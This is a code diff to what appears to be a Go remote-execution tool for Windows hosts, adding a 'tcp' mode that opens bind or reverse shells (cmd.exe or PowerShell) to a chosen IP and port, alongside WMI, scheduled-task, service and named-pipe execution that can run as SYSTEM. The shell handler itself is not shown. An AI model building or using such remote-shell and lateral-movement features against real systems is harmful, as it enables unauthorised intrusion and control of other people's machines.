@@ -1,5 +1,7 @@
 package main
 
+// TODO - Reduce code duplication across modules
+
 import (
 	_ "embed"
 	"flag"
@@ -26,6 +28,11 @@ func main() {
 	runas := args["runas"].(bool)
 	description := args["description"].(string)
 	dropmethod := args["dropmethod"].(string)
+	//evasion := args["evasion"].(string)
+	reverse := args["reverse"].(bool)
+	port := args["port"].(int)
+	ip := args["ip"].(string)
+	shell := args["shell"].(string)
 
 	fmt.Println("Target:", target)
 
@@ -72,8 +79,9 @@ func main() {
 	} else if method == "pipe" {
 		// Enter full-interactive shell using named pipes
 		handlePipeSession(target, username, password, domain, name, dropmethod, runas)
-	} else if method == "http" {
-		// Enter full-interactive shell using HTTP Client/Server
+	} else if method == "tcp" {
+		// Enter full-interactive shell using TCP Client/Server - can be bind or reverse shell
+		handleTCP(target, username, password, domain, name, dropmethod, ip, shell, runas, reverse, port)
 	}
 
 }
@@ -82,7 +90,7 @@ func parseArgs() (map[string]any, error) {
 
 	target := flag.String("target", "", "Remote Hostname or IP address")
 	method := flag.String("method", "wmi", "Method to use for remote execution (wmi, task, service, pipe, http)")
-	batch := flag.Bool("batch", false, "If true, will copy commands to a batch file on target and execute rather than direct cmd processor - useful for long commands")
+	batch := flag.Bool("batch", false, "If true, will copy commands to a batch file on target and execute rather than direct cmd execution - useful for long commands")
 
 	// Credentials (optional depending on run-context)
 	username := flag.String("user", "", "Username for remote authentication - if domain user, be sure to supply -domain flag")
@@ -96,15 +104,27 @@ func parseArgs() (map[string]any, error) {
 	// Service, Task, Pipe parameters
 	name := flag.String("name", "", "Service/Task/Pipe name to use for remote execution - if blank, will generate a random name")
 	description := flag.String("description", "", "Description for the service/task - if blank, will use a default description")
-	runas := flag.Bool("runas", false, "If true, will run the task as the user specified in -user flag instead of SYSTEM - specified user must have Batch Job Rights")
-
+	runas := flag.Bool("runas", false, "If true, will run the task as the user specified in -user flag instead of SYSTEM assuming the user has the correct permissions - does NOT work yet for WMI which will always run as specified user")
 	dropmethod := flag.String("dropmethod", "wmi", "Method to use for creating named pipe (wmi, task, service)")
-
+	reverse := flag.Bool("reverse", false, "If true, will create a reverse shell instead of bind shell - for TCP mode - must specify port")
+	port := flag.Int("port", 8859, "Port to use for TCP shells - must specify port if using TCP mode - default is 4444")
+	ip := flag.String("ip", "1.1.1.1", "IP to use for TCP reverse shells")
+	shell := flag.String("shell", "cmd", "Shell to use for TCP shells - default is cmd.exe, valid options are (cmd, ps)")
 	flag.Parse()
 
-	validMethods := []string{"wmi", "task", "service", "pipe", "http"}
+	validMethods := []string{"wmi", "task", "service", "pipe", "tcp", "http"}
 	if !slices.Contains(validMethods, *method) {
 		return nil, fmt.Errorf("invalid method: %s", *method)
+	}
+
+	validShells := []string{"cmd", "ps"}
+	if !slices.Contains(validShells, *shell) {
+		return nil, fmt.Errorf("invalid shell: %s", *shell)
+	}
+	if *shell == "ps" {
+		*shell = "powershell.exe"
+	} else if *shell == "cmd" {
+		*shell = "cmd.exe"
 	}
 
 	if *target == "" {
@@ -113,6 +133,12 @@ func parseArgs() (map[string]any, error) {
 
 	if *username != "" && *password == "" {
 		return nil, fmt.Errorf("password is required if username is provided")
+	}
+
+	if *method == "tcp" {
+		if *reverse && *ip == "1.1.1.1" {
+			return nil, fmt.Errorf("IP is required if reverse shell is specified")
+		}
 	}
 
 	arguments := map[string]any{
@@ -127,6 +153,10 @@ func parseArgs() (map[string]any, error) {
 		"runas":       *runas,
 		"evasion":     *evasion,
 		"dropmethod":  *dropmethod,
+		"reverse":     *reverse,
+		"port":        *port,
+		"ip":          *ip,
+		"shell":       *shell,
 	}
 	return arguments, nil
 }
